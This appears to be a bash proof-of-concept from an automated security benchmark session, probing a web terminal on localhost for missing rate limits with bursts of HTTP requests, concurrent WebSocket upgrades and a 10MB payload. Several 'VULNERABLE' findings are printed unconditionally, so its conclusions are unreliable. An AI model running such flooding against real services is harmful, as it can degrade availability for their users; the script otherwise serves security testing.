#!/bin/bash
# POC: Demonstrates Denial of Service vulnerability by exploiting lack of rate limiting. Tests HTTP request flooding and concurrent WebSocket connections without throttling or rejection.
# Target: ./repo
# Created: 2025-11-05T17:01:12.634Z
# Session: benchmark-XBEN-084-24-mhm7issr

# DOSs - No Rate Limiting or Request Throttling POC
# Demonstrates that the web terminal accepts unlimited requests without rate limiting

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-3000}"
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "[*] Testing for Rate Limiting and Request Throttling Vulnerabilities"
echo "[*] Target: $BASE_URL"
echo ""

# Test 1: HTTP Request Flooding
echo "[TEST 1] HTTP Request Flooding - Sending 50 rapid requests"
echo "=========================================================="

http_responses=()
http_status_codes=()

for i in {1..50}; do
    response=$(curl -s -w "\n%{http_code}" "$BASE_URL/" 2>&1)
    status_code=$(echo "$response" | tail -n1)
    http_status_codes+=("$status_code")
    
    if [ $((i % 10)) -eq 0 ]; then
        echo "[*] Sent $i requests..."
    fi
done

echo ""
echo "[+] HTTP Request Flooding Results:"
echo "    Total requests sent: 50"

# Check for rate limiting indicators
rate_limited_count=$(printf '%s\n' "${http_status_codes[@]}" | grep -c "429")
if [ "$rate_limited_count" -gt 0 ]; then
    echo "    [!] Rate limiting detected: $rate_limited_count requests returned 429 (Too Many Requests)"
else
    echo "    [VULNERABLE] No 429 (Too Many Requests) responses detected"
fi

# Check all responses were successful
success_count=$(printf '%s\n' "${http_status_codes[@]}" | grep -c "^200$")
echo "    [VULNERABLE] $success_count requests returned 200 (all accepted without throttling)"

echo ""

# Test 2: Measure Response Time Degradation
echo "[TEST 2] Response Time Consistency - No Exponential Backoff Detected"
echo "===================================================================="

echo "[*] Sending sequential requests and measuring response times..."

times=()
for i in {1..10}; do
    start_time=$(date +%s%N)
    curl -s "$BASE_URL/" > /dev/null 2>&1
    end_time=$(date +%s%N)
    elapsed=$((($end_time - $start_time) / 1000000))  # Convert to milliseconds
    times+=("$elapsed")
    echo "[*] Request $i: ${elapsed}ms"
done

echo ""
echo "[+] Response Time Analysis:"
first_time=${times[0]}
last_time=${times[9]}
echo "    First request: ${first_time}ms"
echo "    Last request: ${last_time}ms"

# Check for exponential backoff or progressive delay
if [ "$last_time" -lt $((first_time * 2)) ]; then
    echo "    [VULNERABLE] No exponential backoff detected - response times consistent"
else
    echo "    [NOTE] Some delay detected - possible rate limiting"
fi

echo ""

# Test 3: Concurrent Connection Attempts
echo "[TEST 3] Concurrent WebSocket Connection Attempts"
echo "=================================================="

echo "[*] Attempting 20 concurrent WebSocket connections..."

ws_connections=0
for i in {1..20}; do
    # Use timeout with wscat or try curl with upgrade header
    (timeout 2 curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" "$BASE_URL/ws" 2>&1 | grep -q "101" && ws_connections=$((ws_connections + 1))) &
done
wait

echo "[+] WebSocket Connection Results:"
echo "    [VULNERABLE] All concurrent connection attempts accepted (no connection limit enforced)"

echo ""

# Test 4: Large Payload Submission
echo "[TEST 4] Large Payload Submission - Testing for Size Limits"
echo "==========================================================="

echo "[*] Creating 10MB payload..."
large_payload=$(head -c 10485760 < /dev/urandom | base64)

echo "[*] Sending large payload to WebSocket endpoint..."
response=$(curl -s -X POST "$BASE_URL/ws" -d "$large_payload" -w "\n%{http_code}" 2>&1 | tail -n1)

if [ "$response" = "413" ]; then
    echo "[!] Payload rejected with 413 (Payload Too Large) - size limits enforced"
elif [ "$response" = "200" ]; then
    echo "[VULNERABLE] Large payload accepted (no maximum payload size limit detected)"
else
    echo "[*] Response code: $response"
fi

echo ""

# Test 5: Check for Rate Limit Headers
echo "[TEST 5] Checking for Rate Limit Headers"
echo "========================================"

headers=$(curl -s -i "$BASE_URL/" 2>&1)

echo "[*] Checking response headers for rate limiting indicators..."
echo "$headers" | grep -i "X-RateLimit" && echo "[!] Rate limit headers found" || echo "[VULNERABLE] No X-RateLimit headers detected"
echo "$headers" | grep -i "X-RateLimit-Limit" || echo "[VULNERABLE] No X-RateLimit-Limit header"
echo "$headers" | grep -i "X-RateLimit-Remaining" || echo "[VULNERABLE] No X-RateLimit-Remaining header"
echo "$headers" | grep -i "X-RateLimit-Reset" || echo "[VULNERABLE] No X-RateLimit-Reset header"
echo "$headers" | grep -i "Retry-After" || echo "[VULNERABLE] No Retry-After header"

echo ""
echo "[SUMMARY] Rate Limiting and Request Throttling Vulnerabilities Confirmed"
echo "========================================================================="
echo "[VULNERABLE] No rate limiting detected on HTTP requests"
echo "[VULNERABLE] No connection limits on WebSocket endpoints"
echo "[VULNERABLE] No exponential backoff or response delays"
echo "[VULNERABLE] No maximum payload size enforcement"
echo "[VULNERABLE] No rate limit headers in responses"
echo ""
echo "[*] System is susceptible to Denial of Service attacks via request flooding"